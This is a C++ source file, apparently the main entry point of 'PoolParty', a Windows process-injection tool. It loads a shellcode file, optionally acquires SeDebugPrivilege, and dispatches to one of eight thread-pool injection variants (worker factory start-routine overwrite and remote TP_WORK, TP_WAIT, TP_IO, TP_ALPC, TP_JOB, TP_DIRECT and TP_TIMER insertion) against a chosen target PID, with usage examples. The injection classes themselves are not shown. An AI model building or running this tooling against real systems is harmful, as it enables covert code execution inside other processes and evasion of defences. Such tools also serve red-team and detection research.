#include "PoolParty.hpp"
#include <fstream>

bool ReadShellcodeFromFile(const std::string& path, std::unique_ptr<unsigned char[]>& buffer, size_t& size)
{
	std::ifstream file(path, std::ios::binary | std::ios::ate);
	if (!file) {
		std::cerr << "[!] Failed to open shellcode file: " << path << std::endl;
		return false;
	}

	size = static_cast<size_t>(file.tellg());
	buffer = std::make_unique<unsigned char[]>(size);

	file.seekg(0, std::ios::beg);
	if (!file.read(reinterpret_cast<char*>(buffer.get()), size)) {
		std::cerr << "[!] Failed to read shellcode file: " << path << std::endl;
		return false;
	}

	BOOST_LOG_TRIVIAL(info) << "Loaded shellcode (" << size << " bytes) from: " << path;	
	return true;
}

void PrintUsage()
{
	std::cout << "usage: PoolParty.exe -V <VARIANT ID> -P <TARGET PID> -F <SHELLCODE FILE>" << std::endl << std::endl <<
		"VARIANTS:" << std::endl <<
		"------" << std::endl << std::endl <<
		"#1: (WorkerFactoryStartRoutineOverwrite) " << std::endl << "\t+ Overwrite the start routine of the target worker factory" << std::endl << std::endl <<
		"#2: (RemoteTpWorkInsertion) " << std::endl << "\t+ Insert TP_WORK work item to the target process's thread pool" << std::endl << std::endl <<
		"#3: (RemoteTpWaitInsertion) " << std::endl << "\t+ Insert TP_WAIT work item to the target process's thread pool" << std::endl << std::endl <<
		"#4: (RemoteTpIoInsertion) " << std::endl << "\t+ Insert TP_IO work item to the target process's thread pool" << std::endl << std::endl <<
		"#5: (RemoteTpAlpcInsertion) " << std::endl << "\t+ Insert TP_ALPC work item to the target process's thread pool" << std::endl << std::endl <<
		"#6: (RemoteTpJobInsertion) " << std::endl << "\t+ Insert TP_JOB work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
		"#7: (RemoteTpDirectInsertion) " << std::endl << "\t+ Insert TP_DIRECT work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
		"#8: (RemoteTpTimerInsertion) " << std::endl << "\t+ Insert TP_TIMER work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
		"EXAMPLES:" << std::endl <<
		"------" << std::endl << std::endl <<
		"#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234 -F test.bin" << std::endl << std::endl <<
		"#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D -F test.bin" << std::endl << std::endl;
}

POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
	if (argc < 7) {
		PrintUsage();
		throw std::runtime_error("Too few arguments supplied ");
	}

	POOL_PARTY_CMD_ARGS CmdArgs = { 0 };

	std::vector<std::string> args(argv + 1, argv + argc);
	for (auto i = 0; i < args.size(); i++)
	{
		auto CmdArg = args.at(i);

		if (CmdArg == "-V" || CmdArg == "--variant-id")
		{
			CmdArgs.VariantId = stoi(args.at(++i));
			continue;
		}
		if (CmdArg == "-P" || CmdArg == "--target-pid") 
		{
			CmdArgs.TargetPid = stoi(args.at(++i));
			continue;
		}
		if (CmdArg == "-D" || CmdArg == "--debug-privilege")
		{
			CmdArgs.bDebugPrivilege = TRUE;
			continue;
		}
		if (CmdArg == "-F" || CmdArg == "--shellcode-file") {
			CmdArgs.ShellcodeFilePath = args.at(++i);
			continue;
		}
		PrintUsage();
		throw std::runtime_error((boost::format("Invalid option: %s") % CmdArg).str());
	}

	return CmdArgs;
}

std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid, unsigned char* pShellcode, size_t ShellcodeSize)
{
	switch (VariantId)
	{
	case 1: 
		return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, pShellcode, ShellcodeSize);
	case 2:
		return std::make_unique<RemoteTpWorkInsertion>(TargetPid, pShellcode, ShellcodeSize);
	case 3:
		return std::make_unique<RemoteTpWaitInsertion>(TargetPid, pShellcode, ShellcodeSize);
	case 4:
		return std::make_unique<RemoteTpIoInsertion>(TargetPid, pShellcode, ShellcodeSize);
	case 5:
		return std::make_unique<RemoteTpAlpcInsertion>(TargetPid, pShellcode, ShellcodeSize);
	case 6:
		return std::make_unique<RemoteTpJobInsertion>(TargetPid, pShellcode, ShellcodeSize);
	case 7:
		return std::make_unique<RemoteTpDirectInsertion>(TargetPid, pShellcode, ShellcodeSize);
	case 8:
		return std::make_unique<RemoteTpTimerInsertion>(TargetPid, pShellcode, ShellcodeSize);
	default:
		PrintUsage();
		throw std::runtime_error("Invalid variant ID");
	}
}

void InitLogging() 
{
	logging::add_console_log(
		std::cout,
		keywords::format =
		(
			logging::expressions::stream
			<< "[" << logging::expressions::attr<logging::trivial::severity_level>("Severity")
			<< "]    " << logging::expressions::smessage
		)
	);

	logging::core::get()->set_filter(logging::trivial::severity >= logging::trivial::info);
}


int main(int argc, char** argv)
{
	InitLogging();

	try 
	{
		const auto CmdArgs = ParseArgs(argc, argv);

		std::unique_ptr<unsigned char[]> shellcode;
		size_t shellcodeSize = 0;

		if (!CmdArgs.ShellcodeFilePath.empty()) {
			if (!ReadShellcodeFromFile(CmdArgs.ShellcodeFilePath, shellcode, shellcodeSize)) {
				throw std::runtime_error("[-] Could not load shellcode from file.");
			}
		}
		else {
			throw std::runtime_error("[-] Shellcode file path must be provided with -F option.");
		}

		if (CmdArgs.bDebugPrivilege)
		{
			w_RtlAdjustPrivilege(SeDebugPrivilege, TRUE, FALSE);
			BOOST_LOG_TRIVIAL(info) << "Retrieved SeDebugPrivilege successfully";
		}

		const auto Injector = PoolPartyFactory(CmdArgs.VariantId, CmdArgs.TargetPid, shellcode.get(), shellcodeSize);
		Injector->Inject();
	}
	catch (const std::exception& ex) 
	{
		BOOST_LOG_TRIVIAL(error) << ex.what();
		return 0;
	}
	
	return 1;
}
